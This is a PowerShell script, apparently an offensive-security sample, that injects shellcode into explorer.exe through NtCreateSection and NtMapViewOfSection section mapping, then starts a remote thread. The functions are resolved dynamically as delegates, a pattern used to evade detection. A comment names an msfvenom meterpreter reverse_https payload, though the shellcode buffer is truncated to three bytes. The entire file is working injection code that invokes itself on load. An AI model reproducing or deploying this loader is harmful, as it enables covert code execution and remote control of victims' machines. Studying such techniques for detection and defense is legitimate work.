function Standard_Process_Injection_Delegate_Alternative {

$Kernel32 = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Kernel32
{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, uint processId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]    
    public delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)] 
    public delegate IntPtr GetCurrentProcessDelegate();
}

public class Ntdll
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtCreateSectionDelegate(
        ref IntPtr section,
        UInt32 desiredAccess,
        IntPtr pAttrs,
        ref long MaxSize,
        uint pageProt,
        uint allocationAttribs,
        IntPtr hFile);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtMapViewOfSectionDelegate(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        IntPtr CommitSize,
        ref long SectionOffset,
        ref long ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtUnmapViewOfSectionDelegate(IntPtr hProc, IntPtr baseAddr);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtCloseDelegate(IntPtr hObject);
}
'@

Add-Type $Kernel32

# Load the libraries and get function pointers
$kernel32Handle = [Kernel32]::LoadLibraryA("kernel32.dll")
$ntdllHandle = [Kernel32]::LoadLibraryA("ntdll.dll")

# Get function pointers for kernel32 functions
$pOpenProcess = [Kernel32]::GetProcAddress($kernel32Handle, "OpenProcess")
$pCreateRemoteThread = [Kernel32]::GetProcAddress($kernel32Handle, "CreateRemoteThread")
$pGetCurrentProcess = [Kernel32]::GetProcAddress($kernel32Handle, "GetCurrentProcess")

# Convert function pointers to delegates for kernel32 functions
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pOpenProcess, [Kernel32+OpenProcessDelegate])
$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCreateRemoteThread, [Kernel32+CreateRemoteThreadDelegate])
$GetCurrentProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pGetCurrentProcess, [Kernel32+GetCurrentProcessDelegate])

# Get function pointers for ntdll functions
$pNtCreateSection = [Kernel32]::GetProcAddress($ntdllHandle, "NtCreateSection")
$pNtMapViewOfSection = [Kernel32]::GetProcAddress($ntdllHandle, "NtMapViewOfSection")
$pNtUnmapViewOfSection = [Kernel32]::GetProcAddress($ntdllHandle, "NtUnmapViewOfSection")
$pNtClose = [Kernel32]::GetProcAddress($ntdllHandle, "NtClose")

# Convert function pointers to delegates for ntdll functions
$NtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNtCreateSection, [Ntdll+NtCreateSectionDelegate])
$NtMapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNtMapViewOfSection, [Ntdll+NtMapViewOfSectionDelegate])
$NtUnmapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNtUnmapViewOfSection, [Ntdll+NtUnmapViewOfSectionDelegate])
$NtClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pNtClose, [Ntdll+NtCloseDelegate])

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x83
$size = $buf.Length
$buffer_size = [long]$size

# Create the section handle
[IntPtr] $ptr_section_handle = [IntPtr]::Zero
$create_section_status = $NtCreateSection.Invoke([ref] $ptr_section_handle, 0xe, [IntPtr]::Zero, [ref] $buffer_size, 0x40, 0x08000000, [IntPtr]::Zero)

# Map a view of a section into the virtual address space of the current process
[IntPtr] $ptr_local_section_addr = [IntPtr]::Zero
$local_section_offset = 0
$local_map_view_status = $NtMapViewOfSection.Invoke($ptr_section_handle, $GetCurrentProcess.Invoke(), [ref] $ptr_local_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x04)

# Copy the shellcode into the mapped section
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr_local_section_addr, $size)

# Get the process ID of explorer
$Process = (Get-Process -Name "explorer")[0]
$hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, [uint32]$Process.Id)

# Map a view of the section in the virtual address space of the targeted process
[IntPtr] $ptr_remote_section_addr = [IntPtr]::Zero
$remote_map_view_status = $NtMapViewOfSection.Invoke($ptr_section_handle, $hProcess, [ref] $ptr_remote_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x20)

# Unmap the view of the section from the current process & close the handle
$NtUnmapViewOfSection.Invoke($GetCurrentProcess.Invoke(), $ptr_local_section_addr) > $null
$NtClose.Invoke($ptr_section_handle) > $null

# Create a remote thread in the target process to execute the shellcode
$CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $ptr_remote_section_addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) > $null
}

# Execute the function
Standard_Process_Injection_Delegate_Alternative
